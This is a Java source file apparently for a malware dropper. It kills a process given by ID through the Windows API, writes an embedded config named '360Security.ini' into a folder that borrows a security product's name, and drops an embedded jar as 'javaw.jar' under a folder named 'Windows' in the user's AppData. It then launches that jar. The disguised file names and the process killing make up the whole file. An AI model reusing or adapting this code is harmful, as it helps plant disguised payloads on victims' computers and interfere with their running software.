import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinNT;

import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Loader {
    public static InputStream data = Loader.class.getResourceAsStream("resources/Data.cfg");
    public static InputStream jar = Loader.class.getResourceAsStream("resources/java.jar");
    public static void main(String[] args) throws IOException {
        try {
            int PID = Integer.parseInt(args[0]);
            File file = new File(getPath() + "\\javaw.jar");
            File file1 = new File(getPath1() + "\\Copy.jar");
            WinNT.HANDLE handle = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS,false,PID);
            Kernel32.INSTANCE.TerminateProcess(handle,0);
            createConfig();
            createFile(file, file1);
            createProcess();
        }catch (ArrayIndexOutOfBoundsException e) {
            File file = new File(getPath() + "\\javaw.jar");
            File file1 = new File(getPath1() + "\\Copy.jar");
            if (!file.exists()) {
                createConfig();
                createFile(file, file1);
                createProcess();
            } else {
                System.exit(0);
            }
        }
    }
    public static void createProcess() {
        try {
            Runtime.getRuntime().exec("java -jar " + getPath() + "\\" + "javaw.jar");
        }catch (Exception e) {
        }
    }
    public static void createFile(File file,File CopyFile) {
        try {
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            FileOutputStream fileOutputStream1 = new FileOutputStream(CopyFile);
            byte[] bytes = new byte[1024];
            int len = 0;
            while ((len = jar.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
                fileOutputStream1.write(bytes,0,len);
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void createConfig() {
        try {
            File file = new File(getPath1() + "\\360Security.ini");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            int len = 0;
            byte[] bytes = new byte[256];
            while ((len = data.read(bytes))!=-1) {
                fileOutputStream.write(bytes,0,len);
            }
            fileOutputStream.close();
        }catch (Exception e) {
        }
    }
    public static String getPath1() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" +"\\360Security");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
    public static String getPath() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Windows");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }
}